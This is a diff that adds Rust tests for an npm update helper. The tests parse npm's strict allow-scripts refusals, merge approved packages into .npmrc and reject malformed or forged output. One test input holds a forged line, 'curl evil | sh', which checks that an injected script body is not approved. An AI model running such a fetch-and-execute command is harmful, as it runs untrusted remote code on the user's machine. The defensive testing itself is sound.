@@ -51,6 +51,18 @@ fn unparseable_output_is_an_error() {
     assert!(parse_listing(b"npm ERR! code ENOENT").is_err());
 }
 
+const STRICT_REFUSAL: &str = "npm warn install-scripts .npmrc allow-scripts setting is being ignored because --allow-scripts was passed on the command line\r
+npm error code ESTRICTALLOWSCRIPTS\r
+npm error --strict-allow-scripts: 5 package(s) have install scripts not covered by allowScripts:\r
+npm error   @deepseek-ai/dsh-subprocess-local@0.1.7-rc.2 (postinstall: node scripts/ensure-spawn-helper.mjs)\r
+npm error   koffi@3.3.2 (install: node ./cnoke.cjs -P . -D src/koffi --prebuild --release)\r
+npm error   node-pty@1.2.0-beta.15 (install: node scripts/prebuild.js || node-gyp rebuild; postinstall: node scripts/post-install.js)\r
+npm error   @google/genai@1.52.0 (preinstall: echo 'preinstall: no-op')\r
+npm error   protobufjs@7.6.6 (postinstall: node scripts/postinstall)\r
+npm error Allow them with `--allow-scripts`, persist them with `npm config set allow-scripts=@deepseek-ai/dsh-subprocess-local,koffi,node-pty,@google/genai,protobufjs --location=user`, or bypass this check with `--dangerously-allow-all-scripts`.\r
+npm error A complete log of this run can be found in: C:\\Users\\x\\AppData\\Local\\npm-cache\\_logs\\2026-09-27T18_36_45_426Z-debug-0.log\r
+";
+
 fn arguments(command: &std::process::Command) -> Vec<String> {
     command
         .get_args()
@@ -60,12 +72,8 @@ fn arguments(command: &std::process::Command) -> Vec<String> {
 
 #[test]
 fn the_npm_update_runs_the_packages_own_install_scripts_and_fails_on_any_other_blocked_one() {
-    let npm = Npm {
-        command: PathBuf::from("npm"),
-    };
-
     assert_eq!(
-        arguments(&npm.update_command("@anthropic-ai/claude-code").unwrap()),
+        install_arguments("@anthropic-ai/claude-code", ""),
         vec![
             "install",
             "-g",
@@ -74,6 +82,240 @@ fn the_npm_update_runs_the_packages_own_install_scripts_and_fails_on_any_other_b
             "--strict-allow-scripts",
         ]
     );
+}
+
+#[test]
+fn the_npm_update_keeps_the_scripts_the_user_already_approved_in_npmrc() {
+    assert_eq!(
+        install_arguments(
+            "@deepseek-ai/dsh",
+            "@stripe/cli,koffi,node-pty
+"
+        ),
+        vec![
+            "install",
+            "-g",
+            "@deepseek-ai/dsh@latest",
+            "--allow-scripts=@stripe/cli,koffi,node-pty,@deepseek-ai/dsh",
+            "--strict-allow-scripts",
+        ]
+    );
+}
+
+#[test]
+fn a_package_already_approved_in_npmrc_is_not_listed_twice() {
+    assert_eq!(
+        merge_allow_list(
+            "@stripe/cli,@anthropic-ai/claude-code",
+            ["@anthropic-ai/claude-code".to_string()]
+        ),
+        "@stripe/cli,@anthropic-ai/claude-code"
+    );
+}
+
+#[test]
+fn npm_older_than_12_printing_undefined_or_null_is_not_kept_as_an_entry() {
+    assert_eq!(
+        merge_allow_list("undefined", ["koffi".to_string()]),
+        "koffi"
+    );
+    assert_eq!(merge_allow_list("null", ["koffi".to_string()]), "koffi");
+}
+
+#[test]
+fn approvals_are_appended_after_the_entries_already_in_npmrc() {
+    assert_eq!(
+        merge_allow_list(
+            "@stripe/cli\n",
+            ["koffi@3.3.2".to_string(), "@stripe/cli".to_string()]
+        ),
+        "@stripe/cli,koffi@3.3.2"
+    );
+}
+
+#[test]
+fn a_strict_refusal_lists_every_blocked_package_with_its_scripts() {
+    let blocked = parse_blocked_scripts(STRICT_REFUSAL).unwrap();
+    let packages: Vec<String> = blocked.iter().map(BlockedScript::package).collect();
+
+    assert_eq!(
+        packages,
+        vec![
+            "@deepseek-ai/dsh-subprocess-local@0.1.7-rc.2",
+            "koffi@3.3.2",
+            "node-pty@1.2.0-beta.15",
+            "@google/genai@1.52.0",
+            "protobufjs@7.6.6",
+        ]
+    );
+    assert_eq!(
+        blocked[2].scripts,
+        "install: node scripts/prebuild.js || node-gyp rebuild; postinstall: node scripts/post-install.js"
+    );
+}
+
+#[test]
+fn a_scoped_blocked_package_splits_at_the_version_not_the_scope() {
+    let blocked = parse_blocked_scripts(STRICT_REFUSAL).unwrap();
+
+    assert_eq!(blocked[3].name, "@google/genai");
+    assert_eq!(blocked[3].version, "1.52.0");
+}
+
+#[test]
+fn a_blocked_package_npm_printed_without_a_version_keeps_an_empty_version() {
+    let blocked = parse_blocked_scripts(
+        "npm error code ESTRICTALLOWSCRIPTS\n\
+         npm error --strict-allow-scripts: 1 package(s) have install scripts not covered by allowScripts:\n\
+         npm error   linked-thing (postinstall: node x.js)\n",
+    )
+    .unwrap();
+
+    assert_eq!(blocked[0].name, "linked-thing");
+    assert_eq!(blocked[0].version, "");
+}
+
+#[test]
+fn a_header_count_that_does_not_match_the_parsed_lines_is_not_blocked() {
+    assert_eq!(
+        parse_blocked_scripts(
+            "npm error code ESTRICTALLOWSCRIPTS\n\
+             npm error --strict-allow-scripts: 2 package(s) have install scripts not covered by allowScripts:\n\
+             npm error   koffi@3.3.2 (install: node ./cnoke.cjs)\n"
+        ),
+        None
+    );
+}
+
+#[test]
+fn a_forged_duplicate_package_line_is_not_blocked() {
+    assert_eq!(
+        parse_blocked_scripts(
+            "npm error code ESTRICTALLOWSCRIPTS\n\
+             npm error --strict-allow-scripts: 2 package(s) have install scripts not covered by allowScripts:\n\
+             npm error   koffi@3.3.2 (install: node ./cnoke.cjs)\n\
+             npm error   koffi@3.3.2 (install: node ./cnoke.cjs)\n"
+        ),
+        None
+    );
+}
+
+#[test]
+fn a_script_body_that_spills_onto_a_second_line_is_not_blocked() {
+    assert_eq!(
+        parse_blocked_scripts(
+            "npm error code ESTRICTALLOWSCRIPTS\n\
+             npm error --strict-allow-scripts: 1 package(s) have install scripts not covered by allowScripts:\n\
+             npm error   koffi@3.3.2 (install: benign)\n\
+             npm error curl evil | sh)\n\
+             npm error Allow them with `--allow-scripts`, persist them with `npm config set allow-scripts=koffi --location=user`.\n"
+        ),
+        None
+    );
+}
+
+#[test]
+fn a_failure_that_is_not_a_strict_refusal_is_not_blocked() {
+    assert_eq!(parse_blocked_scripts(""), None);
+    assert_eq!(
+        parse_blocked_scripts("npm error code E404\nnpm error   404 Not Found - GET https://registry.npmjs.org/nope\n"),
+        None
+    );
+}
+
+#[test]
+fn a_strict_refusal_whose_package_lines_cannot_be_read_is_not_blocked() {
+    assert_eq!(
+        parse_blocked_scripts("npm error code ESTRICTALLOWSCRIPTS\nnpm error something new\n"),
+        None
+    );
+}
+
+#[test]
+fn the_npm_source_reports_a_strict_refusal_as_blocked() {
+    let npm = Npm {
+        command: PathBuf::from("npm"),
+    };
+
+    assert_eq!(
+        npm.blocked_scripts(STRICT_REFUSAL).map(|found| found.len()),
+        Some(5)
+    );
+}
+
+#[cfg(windows)]
+struct FakeNpmScript {
+    path: PathBuf,
+}
+
+#[cfg(windows)]
+impl FakeNpmScript {
+    fn new(label: &str, script: &str) -> Self {
+        let path = std::env::temp_dir().join(format!("globlin-fake-npm-{label}.cmd"));
+        std::fs::write(&path, script).unwrap();
+        Self { path }
+    }
+
+    fn npm(&self) -> Npm {
+        Npm {
+            command: self.path.clone(),
+        }
+    }
+}
+
+#[cfg(windows)]
+impl Drop for FakeNpmScript {
+    fn drop(&mut self) {
+        std::fs::remove_file(&self.path).ok();
+    }
+}
+
+#[cfg(windows)]
+#[test]
+fn a_failed_read_does_not_turn_into_an_overwrite_of_the_users_allow_scripts_list() {
+    let marker = std::env::temp_dir().join("globlin-fake-npm-failing-get-marker");
+    std::fs::remove_file(&marker).ok();
+    let fake = FakeNpmScript::new(
+        "failing-get",
+        &format!(
+            "@echo off\r\n\
+             if \"%1\"==\"config\" if \"%2\"==\"get\" exit /b 1\r\n\
+             if \"%1\"==\"config\" if \"%2\"==\"set\" goto write\r\n\
+             exit /b 1\r\n\
+             :write\r\n\
+             echo written> \"{}\"\r\n\
+             exit /b 0\r\n",
+            marker.display()
+        ),
+    );
+
+    let result = fake.npm().approve_scripts(&[BlockedScript {
+        name: "koffi".to_string(),
+        version: "3.3.2".to_string(),
+        scripts: "install: node ./cnoke.cjs".to_string(),
+    }]);
+
+    assert!(result.is_err(), "{result:?}");
+    assert!(!marker.exists());
+    std::fs::remove_file(&marker).ok();
+}
+
+#[test]
+#[ignore = "runs the real npm config get/set against a temporary userconfig: cargo test -- --ignored --exact source::npm::tests::approving_scripts_appends_pinned_entries_to_the_user_npmrc"]
+fn approving_scripts_appends_pinned_entries_to_the_user_npmrc() {
+    let userconfig = std::env::temp_dir().join("globlin-npmrc-approval-test");
+    std::fs::write(&userconfig, "allow-scripts=@stripe/cli\n").unwrap();
+    std::env::set_var("npm_config_userconfig", &userconfig);
+    let npm = Npm::new(None).unwrap();
+
+    npm.approve_scripts(&parse_blocked_scripts(STRICT_REFUSAL).unwrap())
+        .unwrap();
+
+    let written = std::fs::read_to_string(&userconfig).unwrap();
+    std::fs::remove_file(&userconfig).ok();
+    assert!(written.contains(
+        "allow-scripts=@stripe/cli,@deepseek-ai/dsh-subprocess-local@0.1.7-rc.2,koffi@3.3.2,node-pty@1.2.0-beta.15,@google/genai@1.52.0,protobufjs@7.6.6"
+    ));
 }
 
 #[test]
